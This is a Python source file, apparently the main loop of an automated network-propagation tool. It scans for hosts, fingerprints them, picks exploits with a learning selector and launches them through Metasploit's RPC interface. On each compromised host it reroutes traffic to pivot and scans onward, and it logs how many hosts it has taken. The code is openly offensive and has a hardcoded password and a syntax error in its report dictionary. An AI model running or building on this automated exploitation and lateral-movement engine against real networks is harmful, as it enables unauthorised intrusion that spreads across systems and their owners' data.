import Identifier
import Enricher
import Selector
import Exploiter
from record import Record

from pymongo import MongoClient, ReturnDocument
from metasploit.msfrpc import MsfRpcClient

import json
import time
import copy
import logging
import traceback

def main():
    ### setup
    # initialize structures for orchestration
    # connect to database
    # connect to msf rpc
    # initialize exploits + data for selector
    # initialize logging

    dbClient = MongoClient()
    dbRef = dbClient["NetSprawl"]
    netMapTable = dbRef["Map"]
    exploitTable = dbRef["Exploits"]

    msfClient = MsfRpcClient("pass")

    hostCollection = []
    rootHost = None

    enrichQueue = []
    exploitQueue = []
    postexQueue = []
    processingCounter = 0

    strategy = Selector.defaultStrategy(Exploiter.getExploitNames())

    logger = logging.getLogger("Ophio")
    logger.setLevel(logging.INFO)
    fh = logging.FileHandler("ophio.log")
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)
    logger.addHandler(fh)
    logger.addHandler(ch)

    logger.info("Starting a new scan. Time: {}".format(time.time()))



    # main loop
    while True:
        ### identifier
        # call scanCurrentNetwork on initial host
        # log results of scan
        # identify root node
        # add host records to database

        if len(enrichQueue) == 0: # can skip if prev cycle has identified new hosts
            logger.info("Identifying...")
            identifyResults = json.loads(Identifier.scanCurrentNetwork())
            rootInterfaces = []
            hostsDiscovered = []
            for result in identifyResults:
                rootInterfaces.append(result["network"])
                for hostIp in result["hosts"]:
                    hostsDiscovered.append(hostIp)

        if rootHost == None:
            rootIps = [interface.split("/")[0] for interface in rootInterfaces] # remove CIDR notation
            logger.info("Root host set to IP(s) {}".format(rootIps))
            rootHost = Record(rootIps, None)
            rootHost.exploitStatus["statusCode"] = Record.STATUS_SUCCESS
            rootHost.exploitStatus["exploitUsed"] = "N/A"
            record = rootHost.toDict()
            netMapTable.insert(record)
            rootHost.id = record["_id"]
            hostCollection.append(rootHost)
            enrichQueue.append(rootHost)

        for hostIp in hostsDiscovered:
            uniqueIp = True
            for record in hostCollection:
                if hostIp in record.interfaces:
                    uniqueIp = False

            if uniqueIp:
                logger.info("New host discovered at IP {}".format(hostIp))
                hostRecord = Record([hostIp], rootHost.id)
                record = hostRecord.toDict()
                netMapTable.insert(record)
                hostRecord.id = record["_id"]
                hostCollection.append(hostRecord)
                enrichQueue.append(hostRecord)



        ### enricher
        # call scanHostsForInfo on list of hosts, excluding self
        # log results of scans
        # append information to host records in database

        if len(enrichQueue) > 0:
            logger.info("Enriching...")
        while len(enrichQueue) > 0:
            hostRecord = enrichQueue.pop(0)
            processingCounter += 1

            logger.info("Scanning host at IP {}".format(hostRecord.interfaces))
            enrichResults = json.loads(Enricher.scanHostsForInfo(hostRecord.interfaces)[0])

            # TODO concatenate results if there are multiple interfaces on a host
            hostRecord.os = enrichResults[0]
            hostRecord.openPorts = enrichResults[1:] if len(enrichResults) > 1 else []
            netMapTable.update(
                {'_id': hostRecord.id},
                {'$set':
                    {
                        'os': hostRecord.os,
                        'openPorts': hostRecord.openPorts
                    }
                 }
            )
            exploitQueue.append(hostRecord)



        ### selector/exploiter
        # call search on enriched host data
        # attempt exploits in recommended order
        # log results and update selector after each exploit run
        # append exploit status (exploit used, MS session) to host records

        if len(exploitQueue) > 0:
            logger.info("Exploiting...")
        while len(exploitQueue) > 0:
            hostRecord = exploitQueue.pop(0)
            processingCounter += 1

            logger.info("Profiling host at IP {}".format(hostRecord.interfaces))
            localIp = rootHost.interfaces[0]
            targetIp = hostRecord.interfaces[0]
            hostData = copy.copy(hostRecord.openPorts)
            hostData.insert(0, hostRecord.os)
            exploitOrder = strategy.search(hostData)
            logger.debug("Recommended ordering: {}".format(exploitOrder))

            for exploit in exploitOrder:
                logger.info("Attempting exploit {} against host".format(exploit))
                try:
                    exploitResults = Exploiter.callExploit(msfClient, exploit, targetIp, localIp)
                    time.sleep(1) # takes time to populate session list
                    msfSession = Exploiter.getSessionbyExploitUUID(msfClient, exploitResults["uuid"])
                    exploitSuccess = msfSession != None
                except Exception as e:
                    logger.info("Exploit {} failed abnormally - {}".format(exploit, e))
                    # traceback.print_exc()
                    exploitSuccess = False
                strategy.update(hostData, exploit, exploitSuccess)
                if exploitSuccess:
                    break

            if not exploitSuccess:
                logger.info("Failed to exploit host at IP {}".format(targetIp))
                hostRecord.exploitStatus["statusCode"] = Record.STATUS_FAILURE
            else:
                logger.info("Successfully exploited host at IP {}".format(targetIp))
                hostRecord.exploitStatus = {
                    "statusCode": Record.STATUS_SUCCESS,
                    "exploitUsed": exploit,
                    "msfSession": msfSession
                }
                postexQueue.append(hostRecord)

            netMapTable.update(
                {'_id': hostRecord.id},
                {'$set':
                    {
                        "exploitStatus": hostRecord.exploitStatus
                    }
                }
            )



        ### post-exploits
        # identify new networks from exploited hosts
        # add new hosts to records + database

        if len(postexQueue) > 0:
            logger.info("Postexploiting...")
        while len(postexQueue) > 0:
            hostRecord = postexQueue.pop(0)
            processingCounter += 1
            session = hostRecord.exploitStatus["msfSession"]

            # list interfaces from exploited host
            err, interfaces = Exploiter.callPostExploit(msfClient, "remote_host_netinfo", session)
            if err == 1:
                logger.info("Unable to retrieve net info from {}".format(hostRecord.interfaces))
                continue

            # check for newly discovered interfaces
            if len(interfaces) > len(hostRecord.interfaces):
                logger.info("Additional interface(s) identified for {}".format(interfaces))
                hostRecord.interfaces = interfaces
                netMapTable.update(
                    {'_id': hostRecord.id},
                    {'$set':
                        {
                            "interfaces": hostRecord.interfaces
                        }
                    }
                )

                # reconfigure routing to pass through
                err = Exploiter.callPostExploit(msfClient, "alter_network_routes", session)
                if err == 0:
                    logger.info("Modified routing for {}".format(hostRecord.interfaces))
                else:
                    logger.info("Unable to modify routing for {}".format(hostRecord.interfaces))

                # scan from updated host
                # might make sense to have an identify queue, and move this task there
                logger.info("Beginning IP scan from {}".format(hostRecord.interfaces))
                err, ipsFound = Exploiter.callPostExploit(msfClient, "remote_host_scan", session)
                if err == 1:
                    logger.info("Unable to complete scan from {}".format(hostRecord.interfaces))
                else:
                    # for each unique ip: create a new host record, add to collection, db, and enrichQueue
                    newIps = []
                    for hostIp in ipsFound:
                        uniqueIp = True
                        for record in hostCollection:
                            if hostIp in record.interfaces:
                                uniqueIp = False
                        if uniqueIp:
                            newIps.append(hostIp)
                    logger.info("New hosts discovered at IPs ".format(newIps))

                    for newIp in newIps:
                        newRecord = Record([newIp], hostRecord.id)
                        record = newRecord.toDict()
                        netMapTable.insert(record)
                        newRecord.id = record["_id"]
                        hostCollection.append(newRecord)
                        enrichQueue.append(newRecord)

        else:
            logger.info("No new information gained from {}".format(hostRecord.interfaces))



        ### end of cycle
        # identifiers should be rerun periodically to identify new hosts
        # alternative: run once, and restore state from DB info on startup

        logger.info("Reached end of cycle.")

        # generate report iff new information
        if processingCounter > 0:
            # generate stats
            hostsExploited = 0
            timestamp = time.time()
            for hostRecord in hostCollection:
                if hostRecord.exploitStatus["statusCode"] == Record.STATUS_SUCCESS:
                    hostsExploited += 1

            # save exploiter weights to database
            strategyWeights = strategy.export()
            exploitTable.insert(strategyWeights)

            # save a report to file
            report = {
                "timestamp" : timestamp,
                "records_processed" : processingCounter,
                "root_ip" : rootHost.interfaces,
                "hosts_found" : len(hostCollection),
                "hosts_exploited" : hostsExploited,
                "host_collection": record.toDict() for record in hostCollection,
                "strategy_weights_id" : strategyWeights["_id"]

            }
            with open("Reports/Report_{}.json".format(timestamp), "w") as reportFile:
                reportFile.write(json.dumps(report))

        # reset counter for next cycle
        processingCounter = 0

        # sleep if no immediate work
        if len(enrichQueue) == 0:
            logger.info("Nothing new to scan. Sleeping.")
            time.sleep(60)



if __name__ == '__main__':
    main()
